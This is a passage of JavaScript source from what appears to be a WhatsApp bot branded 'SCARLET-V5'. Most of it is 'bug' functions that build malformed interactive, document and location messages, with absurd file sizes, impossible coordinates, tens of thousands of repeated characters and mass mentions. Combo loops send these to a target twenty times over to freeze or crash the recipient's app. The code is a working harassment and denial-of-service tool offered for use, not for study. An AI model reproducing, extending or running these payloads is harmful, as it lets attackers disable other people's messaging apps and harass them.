                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻ ▾⭑̤" + "ꦾ".repeat(70000),
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"\n⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻\n\n' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻","sections":[{"title":"⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: Qtd,
        }
      );

      await bad.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 ⿻ ▾⭑"));
    }

    async function InVisiXz(X, ThM, cct = false, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "",
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 9007199254740991,
                    mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                    fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
                    fileEncSha256:
                      "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                    directPath:
                      "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1723855952",
                    contactVcard: true,
                    thumbnailDirectPath:
                      "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                    thumbnailSha256:
                      "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                    thumbnailEncSha256:
                      "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⭑̤▾ ⿻ ⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ ⿻ ▾⭑̤",
                },
                nativeFlowMessage: {
                  messageParamsJson:
                    '{"name":"galaxy_message","title":"oi","header":" # trashdex - explanation ","body":"xxx"}',
                  buttons: [
                    cct
                      ? {
                          name: "single_select",
                          buttonParamsJson:
                            '{"title":"Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5' +
                            "᬴".repeat(0) +
                            '","sections":[{"title":"⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ","rows":[]}]}',
                        }
                      : {
                          name: "payment_method",
                          buttonParamsJson: "",
                        },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "payment_method",
                      buttonParamsJson: "{}",
                    },
                    {
                      name: "single_select",
                      buttonParamsJson:
                        '{"title":"Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5","sections":[{"title":"𝐀𝐒𝐓𝐑𝐀𝐋 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ","rows":[]}]}',
                    },
                    {
                      name: "galaxy_message",
                      buttonParamsJson:
                        '{"flow_action":"navigate","flow_action_payload":{"screen":"WELCOME_SCREEN"},"flow_cta":"🔥","flow_id":"BY DEVORSIXCORE","flow_message_version":"9","flow_token":"MYPENISMYPENISMYPENIS"}',
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "{}",
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: VisiX,
        }
      );

      await bad.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 ⿻ ▾⭑"));
    }

async function InVisiLoc(X, ThM, ptcp = false) {
      let etc = generateWAMessageFromContent(
        X,
        proto.Message.fromObject({
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "⭑̤▾ ⿻ Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 ⿻ ▾⭑̤‌‌‌‌‌‌‌‌‌‌‌‌‌‏",
                  locationMessage: {
                    degreesLatitude: -999.03499999999999,
                    degreesLongitude: 922.999999999999,
                    name: "⚝Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5⚝",
                    address: "Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5",
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "",
                },
                nativeFlowMessage: {
                  messageParamsJson: " 𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️ ",
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: {
                        title: "Sucess Send Bugs BY⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5",
                        sections: [
                          {
                            title: "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻ 𝐈𝐒 𝐇𝐄𝐑𝐄 ϟ",
                            rows: [],
                          },
                        ],
                      },
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: {},
                    },
                  ],
                },
              },
            },
          },
        }),
        {
          userJid: X,
          quoted: EsQl,
        }
      );
      await VxoZap.relayMessage(
        X,
        etc.message,
        ptcp
          ? {
              participant: {
                jid: X,
              },
            }
          : {}
      );
      console.log(chalk.green("Send Bug By ⭑̤▾ ⿻ ⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 ⿻ ▾⭑"));
    }

/*BARA FUNCTION*/

async function OLDLOC(target, QBug) {
var atc = await generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
    message: {
      interactiveMessage: {
        header: {
          title: "⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥\n",
          locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            jpegThumbnail: global.thumb
          },
          hasMediaAttachment: true
        },
        body: {
          text: "ꦾ".repeat(20) + "@1".repeat(50000)
        },
        nativeFlowMessage: {
          messageParamsJson: " ꦾ".repeat(55000)
        },
        carouselMessage: {}
      }
    }
  }
}), { userJid: target, quoted: QBug })
await bad.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id })
};

async function BugFrezee(target) {
            bad.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5🤓" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "😂⃟⃟⃟⃟⃚ ͢𝄽𝗫𝘃𝗢 𝗢𝘂𝘁𝄽⃟⃟⃟🇮🇩",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "Barainfinity@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );            
        };
        async function EncryptMessage(target) {
    const locationMessageContent = proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        locationMessage: {
            degreesLatitude: -999.03499999999999,
            degreesLongitude: 999.03499999999999,
            name: "ꦾ".repeat(50000),
            url: "@1".repeat(30),
            mentionedJid: [
								"1@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
            jpegThumbnail: global.thumb
        }
      }
    }
    });

    const encryptedMessage = generateWAMessageFromContent(target, locationMessageContent, { userJid: target });

    await bad.relayMessage(target, encryptedMessage.message, { participant: { jid: target } });
};

        async function DocSystem(target) {
            let virtex = "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝗖𝗥𝗔𝗦𝗛𝄽⃟⃟⃟🇮🇩";

            bad.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyzoXSENTRY" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        async function DocSystem2(target) {
            bad.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DeepDocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(20) + "@1".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "bad ⚔️" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "Sent",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "AVILIABLEBYBara",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "bad@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };
        async function DocSystem3(target) {
            bad.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "XHIROXD",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "Tra͢sᯭh͢ Ui-Aviliable",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "TypeTrashUi-Killer"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Sent",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "BaraXS",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "bad@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
            async function FrezeeMsg2(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝗡𝗢 𝗖𝗢𝗨𝗡𝗧𝗘𝗥𝄽⃟⃟⃟🇮🇩⿻";
            let memekz = Date.now();

            await bad.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5 𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇮🇩" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "SkyziEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
        
async function yoiAi(query) {
  return new Promise(async (resolve, reject) => {
    axios.get('https://api.yanzbotz.live/api/ai/labs-perplexity', {
      params: {
        query: query,
        model: 'llama-3.1-sonar-large-128k-online'
      }
    })
    .then(response => {
      resolve(response.data);
    })
    .catch(error => {
      reject(error);
    });
  });
};
        

async function FrezeeMsg1(target) {
            let virtex = "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻";

            bad.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⿻ᬃ😂⃟⃟⃟⃟⃚ ͢𝄽⿻ 𝐒𝐂𝐀𝐑𝐋𝐄𝐓-𝐕5𝗜𝗦 𝗛𝗘𝗥𝗘𝄽⃟⃟⃟🇳🇬🇳🇬⿻" + "ꦾ".repeat(50000) + "@1".repeat(30)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "BaraEXECUTE" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
        
async function Combox(target) {
for (let i = 0; i < 20; i++) {
await DocSystem(target, Null)
await DocSystem2(target, Null)
await DocSystem3(target, Null)
await BugFrezee(target, Null)
await EncryptMessage(target, Null)
await FrezeeMsg1(target, Null)
await FrezeeMsg2(target, Null)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}

async function Combox2(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}

async function Combox3(target) {
for (let i = 0; i < 20; i++) {
await CrashUi(target)
await InVisiXz(target)
await InVisiLoc(target)
await DocSystem(target)
await DocSystem2(target)
await DocSystem3(target)
await BugFrezee(target)
await EncryptMessage(target)
await FrezeeMsg1(target)
await FrezeeMsg2(target)
}
console.log(chalk.red.bold(`𝗦𝗘𝗡𝗗𝗘𝗥 𝗖𝗢𝗠𝗕𝗢𝗫 𝗧𝗢 ${target}`))
}
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}

async function sendQP(X, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(X, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: X });

    await bad.relayMessage(X, qpMessage.message, { participant: { jid: X }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(X, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(X, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: X });

    await bad.relayMessage(X, sessionStructure.message, { participant: { jid: X }, messageId: sessionStructure.key.id });
}


		const Porke = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			'message': {
				"interactiveMessage": {
					"header": {
						"hasMediaAttachment": true,
						"jpegThumbnail": fs.readFileSync(`./thumb.png`)
					},
					"nativeFlowMessage": {
						"buttons": [{
							"name": "review_and_pay",
